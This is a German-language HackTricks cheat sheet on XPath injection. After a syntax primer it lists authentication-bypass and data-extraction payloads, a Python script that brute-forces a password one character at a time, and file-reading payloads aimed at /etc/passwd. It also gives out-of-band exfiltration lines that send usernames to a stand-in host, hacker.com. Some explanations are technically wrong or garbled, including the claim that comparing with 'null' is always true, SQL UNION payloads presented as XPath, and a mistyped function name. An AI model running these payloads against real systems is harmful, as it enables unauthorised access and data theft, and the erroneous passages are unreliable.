# XPATH-Injection

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen.

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden.

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattformupdates informiert.

**Treten Sie uns auf** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!

## Grundlegende Syntax

Eine Angriffstechnik namens XPath-Injection wird verwendet, um Anwendungen auszunutzen, die XPath (XML Path Language)-Abfragen basierend auf Benutzereingaben erstellen, um XML-Dokumente abzufragen oder zu navigieren.

### Beschriebene Knoten

Ausdr√ºcke werden verwendet, um verschiedene Knoten in einem XML-Dokument auszuw√§hlen. Diese Ausdr√ºcke und ihre Beschreibungen sind wie folgt zusammengefasst:

- **nodename**: Alle Knoten mit dem Namen "nodename" werden ausgew√§hlt.
- **/**: Die Auswahl erfolgt vom Wurzelknoten aus.
- **//**: Knoten, die der Auswahl vom aktuellen Knoten aus entsprechen, werden unabh√§ngig von ihrer Position im Dokument ausgew√§hlt.
- **.**: Der aktuelle Knoten wird ausgew√§hlt.
- **..**: Der Elternknoten des aktuellen Knotens wird ausgew√§hlt.
- **@**: Attribute werden ausgew√§hlt.

### XPath-Beispiele

Beispiele f√ºr Pfadausdr√ºcke und ihre Ergebnisse sind:

- **bookstore**: Alle Knoten mit dem Namen "bookstore" werden ausgew√§hlt.
- **/bookstore**: Das Wurzelelement "bookstore" wird ausgew√§hlt. Es ist zu beachten, dass ein absoluter Pfad zu einem Element durch einen Pfad, der mit einem Schr√§gstrich (/) beginnt, dargestellt wird.
- **bookstore/book**: Alle Buchelemente, die Kinder von "bookstore" sind, werden ausgew√§hlt.
- **//book**: Alle Buchelemente im Dokument werden unabh√§ngig von ihrer Position ausgew√§hlt.
- **bookstore//book**: Alle Buchelemente, die Nachkommen des Elements "bookstore" sind, werden unabh√§ngig von ihrer Position unter dem Element "bookstore" ausgew√§hlt.
- **//@lang**: Alle Attribute mit dem Namen "lang" werden ausgew√§hlt.

### Verwendung von Pr√§dikaten

Pr√§dikate werden verwendet, um Auswahlen zu verfeinern:

- **/bookstore/book[1]**: Das erste Buchelement, das Kind des Elements "bookstore" ist, wird ausgew√§hlt. Eine L√∂sung f√ºr IE-Versionen 5 bis 9, bei denen der erste Knoten als [0] indiziert wird, besteht darin, die SelectionLanguage √ºber JavaScript auf XPath festzulegen.
- **/bookstore/book[last()]**: Das letzte Buchelement, das Kind des Elements "bookstore" ist, wird ausgew√§hlt.
- **/bookstore/book[last()-1]**: Das vorletzte Buchelement, das Kind des Elements "bookstore" ist, wird ausgew√§hlt.
- **/bookstore/book[position()<3]**: Die ersten beiden Buchelemente, die Kinder des Elements "bookstore" sind, werden ausgew√§hlt.
- **//title[@lang]**: Alle Titel-Elemente mit einem Attribut "lang" werden ausgew√§hlt.
- **//title[@lang='en']**: Alle Titel-Elemente mit einem Attributwert "en" f√ºr "lang" werden ausgew√§hlt.
- **/bookstore/book[price>35.00]**: Alle Buchelemente des Buchladens mit einem Preis √ºber 35.00 werden ausgew√§hlt.
- **/bookstore/book[price>35.00]/title**: Alle Titel-Elemente der Buchelemente des Buchladens mit einem Preis √ºber 35.00 werden ausgew√§hlt.

### Umgang mit unbekannten Knoten

Platzhalter werden verwendet, um unbekannte Knoten abzugleichen:

- **\***: Passt zu jedem Elementknoten.
- **@***: Passt zu jedem Attributknoten.
- **node()**: Passt zu jedem Knoten beliebiger Art.

Weitere Beispiele sind:

- **/bookstore/\***: W√§hlt alle Kind-Elementknoten des Elements "bookstore" aus.
- **//\***: W√§hlt alle Elemente im Dokument aus.
- **//title[@\*]**: W√§hlt alle Titel-Elemente mit mindestens einem Attribut beliebiger Art aus.


## Beispiel
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### Zugriff auf die Informationen

XPath Injection ist eine Technik, bei der ein Angreifer b√∂sartige XPath-Ausdr√ºcke in eine Anwendung einschleust, um auf vertrauliche Informationen zuzugreifen. XPath ist eine Abfragesprache, die verwendet wird, um XML-Dokumente zu durchsuchen und zu filtern.

Um XPath Injection durchzuf√ºhren, muss der Angreifer eine Schwachstelle in der Anwendung finden, die es ihm erm√∂glicht, benutzerdefinierte XPath-Ausdr√ºcke einzuf√ºgen. Dies kann beispielsweise durch unsichere Eingabevalidierung oder unzureichende Absicherung der Anwendung geschehen.

Sobald der Angreifer erfolgreich einen b√∂sartigen XPath-Ausdruck in die Anwendung eingeschleust hat, kann er verschiedene Techniken verwenden, um auf vertrauliche Informationen zuzugreifen. Dazu geh√∂ren das Extrahieren von Daten aus der Datenbank, das Umgehen von Zugriffsbeschr√§nkungen und das Ausf√ºhren von Remote-Code.

Um sich vor XPath Injection-Angriffen zu sch√ºtzen, sollten Entwickler sicherstellen, dass alle Benutzereingaben ordnungsgem√§√ü validiert und bereinigt werden, bevor sie in XPath-Ausdr√ºcken verwendet werden. Dar√ºber hinaus sollten Sicherheitsmechanismen wie Zugriffsbeschr√§nkungen und Berechtigungspr√ºfungen implementiert werden, um unbefugten Zugriff auf vertrauliche Informationen zu verhindern.
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### Identifizieren und Stehlen des Schemas

XPath-Injektion kann verwendet werden, um das Schema einer Datenbank zu identifizieren und zu stehlen. Dies kann n√ºtzlich sein, um Informationen √ºber die Datenbankstruktur zu erhalten und weitere Angriffe zu planen.

Um das Schema zu identifizieren, k√∂nnen Sie verschiedene Techniken verwenden:

1. **Blind XPath-Injektion**: Wenn Sie keine direkte R√ºckmeldung von der Anwendung erhalten, k√∂nnen Sie eine blinde XPath-Injektionstechnik verwenden. Durch das Ausnutzen von Fehlern in der Anwendung k√∂nnen Sie feststellen, ob bestimmte Bedingungen wahr oder falsch sind. Sie k√∂nnen beispielsweise versuchen, eine Abfrage zu erstellen, die immer wahr ist, um zu √ºberpr√ºfen, ob eine bestimmte Tabelle oder Spalte vorhanden ist.

   Beispiel:
   ```plaintext
   ' or 1=1 or 'a'='a
   ```

2. **Error-Based XPath-Injektion**: Wenn die Anwendung Fehlermeldungen zur√ºckgibt, k√∂nnen Sie versuchen, Fehler auszul√∂sen, um Informationen √ºber das Schema zu erhalten. Sie k√∂nnen beispielsweise versuchen, eine ung√ºltige XPath-Abfrage einzuf√ºgen, um eine Fehlermeldung mit Informationen √ºber die Datenbankstruktur zu erhalten.

   Beispiel:
   ```plaintext
   ' or 1/0 or 'a'='a
   ```

3. **Union-Based XPath-Injektion**: Wenn die Anwendung UNION-Abfragen unterst√ºtzt, k√∂nnen Sie UNION-Abfragen verwenden, um Informationen aus anderen Tabellen abzurufen. Sie k√∂nnen beispielsweise versuchen, eine UNION-Abfrage einzuf√ºgen, um Informationen aus dem INFORMATION_SCHEMA abzurufen.

   Beispiel:
   ```plaintext
   ' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES --
   ```

Sobald Sie das Schema identifiziert haben, k√∂nnen Sie weitere Angriffe planen, wie z.B. das Extrahieren von Daten aus der Datenbank oder das Durchf√ºhren von weiteren Injektionen, um auf vertrauliche Informationen zuzugreifen.
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## Authentifizierungsumgehung

### **Beispiel f√ºr Abfragen:**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **OR-Bypass bei Benutzername und Passwort (gleicher Wert in beiden)**
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **Missbrauch der Null-Injektion**

Null-Injektion ist eine Technik, bei der XPath-Injektion ausgenutzt wird, um Informationen aus einer Datenbank abzurufen, indem eine Bedingung erzeugt wird, die immer wahr ist. Dies wird erreicht, indem der XPath-Ausdruck so manipuliert wird, dass er immer auf den Wert "null" ausgewertet wird.

#### **Angriffsszenario**

Angenommen, wir haben eine Anwendung, die Benutzern erm√∂glicht, nach Produkten zu suchen, indem sie den Produktnamen eingeben. Die Anwendung verwendet XPath, um die Datenbankabfragen durchzuf√ºhren. Der XPath-Ausdruck sieht folgenderma√üen aus:

```xml
//products/product[name='USER_INPUT']
```

Der Wert "USER_INPUT" wird durch den vom Benutzer eingegebenen Produktnamen ersetzt. Wenn der Benutzer jedoch den Wert "null" eingibt, wird der XPath-Ausdruck zu:

```xml
//products/product[name=null]
```

Da der Vergleich mit "null" immer wahr ist, werden alle Produkte in der Datenbank zur√ºckgegeben.

#### **Ausnutzung der Null-Injektion**

Um die Null-Injektion auszunutzen, k√∂nnen wir den Wert "null" in den Produktnamen eingeben. Dies kann auf verschiedene Arten erfolgen, je nachdem, wie die Anwendung die Benutzereingabe verarbeitet.

Ein Beispiel f√ºr eine m√∂gliche Eingabe w√§re:

```
' or name=null or 'a'='a
```

Der XPath-Ausdruck w√ºrde dann zu:

```xml
//products/product[name='' or name=null or 'a'='a']
```

Da die Bedingung immer wahr ist, werden alle Produkte in der Datenbank zur√ºckgegeben.

#### **Gegenma√ünahmen**

Um die Null-Injektion zu verhindern, sollten die Benutzereingaben immer ordnungsgem√§√ü validiert und bereinigt werden. Es ist wichtig, die Eingaben auf unerw√ºnschte Zeichen oder Muster zu √ºberpr√ºfen und sicherzustellen, dass nur g√ºltige Werte akzeptiert werden.

Dar√ºber hinaus sollte die Anwendung den Zugriff auf die Datenbank auf das erforderliche Minimum beschr√§nken und keine sensiblen Informationen preisgeben. Es ist auch ratsam, die Verwendung von XPath f√ºr Datenbankabfragen zu vermeiden und stattdessen sichere Alternativen wie Prepared Statements oder ORM-Frameworks zu verwenden.
```
Username: ' or 1]%00
```
### **Doppeltes ODER in Benutzername oder im Passwort** (g√ºltig mit nur einem verwundbaren Feld)

WICHTIG: Beachten Sie, dass die **"und" die erste durchgef√ºhrte Operation ist**.
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2¬∫ account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## Zeichenkettenextraktion

Die Ausgabe enth√§lt Zeichenketten und der Benutzer kann die Werte manipulieren, um zu suchen:
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
### **L√§nge eines Werts ermitteln und durch Vergleiche extrahieren:**

XPath-Injektion kann verwendet werden, um die L√§nge eines bestimmten Werts in einer Datenbank zu ermitteln und ihn durch Vergleiche schrittweise zu extrahieren. Dieser Ansatz wird als "Blind Exploitation" bezeichnet, da der Angreifer keine direkte R√ºckmeldung √ºber den extrahierten Wert erh√§lt.

Um die L√§nge eines Werts zu ermitteln, kann der Angreifer eine XPath-Abfrage verwenden, die den zu √ºberpr√ºfenden Wert enth√§lt. Wenn der Wert l√§nger ist als der Vergleichswert, gibt die Abfrage "true" zur√ºck, andernfalls "false". Durch schrittweises Erh√∂hen des Vergleichswerts kann der Angreifer die L√§nge des Werts ermitteln.

Ein Beispiel f√ºr eine solche Abfrage k√∂nnte wie folgt aussehen:

```plaintext
' or string-length(/path/to/value) > <length> or '
```

Der Angreifer kann den `<length>`-Parameter schrittweise erh√∂hen, bis die Abfrage "true" zur√ºckgibt. Auf diese Weise kann der Angreifer die L√§nge des Werts ermitteln.

Sobald die L√§nge bekannt ist, kann der Angreifer den Wert schrittweise extrahieren, indem er jeden einzelnen Zeichenwert √ºberpr√ºft. Dazu kann der Angreifer eine √§hnliche XPath-Abfrage verwenden, die den Zeichenwert an einer bestimmten Position √ºberpr√ºft.

Ein Beispiel f√ºr eine solche Abfrage k√∂nnte wie folgt aussehen:

```plaintext
' or substring(/path/to/value, <position>, 1) = '<character>' or '
```

Der Angreifer kann den `<position>`-Parameter schrittweise erh√∂hen und jeden m√∂glichen Zeichenwert √ºberpr√ºfen, bis die Abfrage "true" zur√ºckgibt. Auf diese Weise kann der Angreifer den Wert schrittweise extrahieren.

Es ist wichtig zu beachten, dass XPath-Injektionen sorgf√§ltig durchgef√ºhrt werden sollten, um unerw√ºnschte Auswirkungen auf das Zielsystem zu vermeiden. Es wird empfohlen, diese Technik nur in einer kontrollierten Umgebung oder mit ausdr√ºcklicher Zustimmung des Eigent√ºmers des Zielsystems anzuwenden.
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **Python Beispiel**
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### Datei lesen

XPath Injection kann verwendet werden, um Dateien auf dem Server zu lesen. Dies kann n√ºtzlich sein, um vertrauliche Informationen zu extrahieren oder um die Funktionalit√§t der Anwendung zu analysieren.

Um eine Datei zu lesen, kann die `document()`-Funktion in Verbindung mit XPath-Ausdr√ºcken verwendet werden. Der XPath-Ausdruck wird in der Regel in einem Eingabefeld oder einer URL platziert, das/ die an den Server gesendet wird.

Ein Beispiel f√ºr einen XPath-Injektionsangriff, um eine Datei zu lesen, k√∂nnte wie folgt aussehen:

```plaintext
' or 1=1 or 'a'='a' or document('/etc/passwd') or '
```

In diesem Beispiel wird der XPath-Ausdruck `' or 1=1 or 'a'='a' or document('/etc/passwd') or '` in das Eingabefeld oder die URL eingef√ºgt. Dadurch wird der Server dazu gebracht, die Datei `/etc/passwd` zu lesen und die Informationen zur√ºckzugeben.

Es ist wichtig zu beachten, dass XPath-Injektionen nicht immer erfolgreich sind, da sie von verschiedenen Faktoren abh√§ngen, wie z.B. der Konfiguration des Servers und der Art der Anwendung. Es ist daher ratsam, verschiedene Techniken auszuprobieren und die Ergebnisse zu √ºberpr√ºfen, um festzustellen, ob eine XPath-Injektion m√∂glich ist.
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## OOB-Ausnutzung

Out-of-Band (OOB) Exploitation ist eine Technik, bei der XPath-Injection verwendet wird, um Informationen aus einer Datenbank abzurufen und sie an einen externen Server zu senden. Dies erm√∂glicht es einem Angreifer, vertrauliche Daten zu extrahieren, ohne direkt auf die Datenbank zugreifen zu m√ºssen.

### OOB-Exploitation-Methoden

Es gibt verschiedene Methoden, um OOB-Exploitation durchzuf√ºhren:

1. DNS-Exfiltration: Der Angreifer injiziert eine speziell gestaltete XPath-Anweisung, die dazu f√ºhrt, dass die Daten an einen DNS-Server gesendet werden, den der Angreifer kontrolliert. Der Angreifer kann dann die DNS-Anfragen √ºberwachen und die extrahierten Daten abrufen.

2. HTTP-Exfiltration: Der Angreifer injiziert eine XPath-Anweisung, die dazu f√ºhrt, dass die Daten an einen externen Webserver gesendet werden, den der Angreifer kontrolliert. Der Angreifer kann dann die HTTP-Anfragen √ºberwachen und die extrahierten Daten abrufen.

3. SMTP-Exfiltration: Der Angreifer injiziert eine XPath-Anweisung, die dazu f√ºhrt, dass die Daten per E-Mail an eine von ihm kontrollierte Adresse gesendet werden. Der Angreifer kann dann die E-Mails √ºberwachen und die extrahierten Daten abrufen.

### Vorteile der OOB-Exploitation

OOB-Exploitation bietet mehrere Vorteile gegen√ºber herk√∂mmlichen In-Band-Exploitationstechniken:

- Es erm√∂glicht den Zugriff auf vertrauliche Daten, ohne direkt auf die Datenbank zugreifen zu m√ºssen.

- Es umgeht m√∂glicherweise vorhandene Sicherheitsma√ünahmen wie Firewalls oder Intrusion Detection Systems (IDS).

- Es erm√∂glicht die Extraktion von Daten √ºber verschiedene Protokolle wie DNS, HTTP oder SMTP.

### Gegenma√ünahmen

Um sich vor OOB-Exploitation zu sch√ºtzen, sollten folgende Ma√ünahmen ergriffen werden:

- Eingabevalidierung: Implementieren Sie eine strenge Eingabevalidierung, um potenziell sch√§dliche Eingaben zu verhindern.

- Parameterisierte Abfragen: Verwenden Sie parameterisierte Abfragen, um die M√∂glichkeit von Injection-Angriffen zu verringern.

- Aktualisierte Software: Stellen Sie sicher, dass alle verwendeten Softwarekomponenten auf dem neuesten Stand sind, um bekannte Sicherheitsl√ºcken zu schlie√üen.

- Sicherheitsbewusstsein: Schulen Sie Ihre Entwickler und Administratoren in sicheren Codierungspraktiken und sensibilisieren Sie sie f√ºr die Risiken von OOB-Exploitation.

- √úberwachung: √úberwachen Sie den Netzwerkverkehr und die Protokolle auf verd√§chtige Aktivit√§ten, um Angriffe fr√ºhzeitig zu erkennen und darauf reagieren zu k√∂nnen.
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### Automatisches Tool

* [xcat](https://xcat.readthedocs.io/)
* [xxxpwn](https://github.com/feakk/xxxpwn)
* [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart)
* [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
* [XmlChor](https://github.com/Harshal35/XMLCHOR)

## Referenzen
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
* [https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)](https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
* [https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen.

**Echtzeit-Hack-News**\
Bleiben Sie mit den neuesten Nachrichten und Einblicken aus der schnelllebigen Hacking-Welt auf dem Laufenden.

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattformupdates informiert.

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **bei und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!**

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>
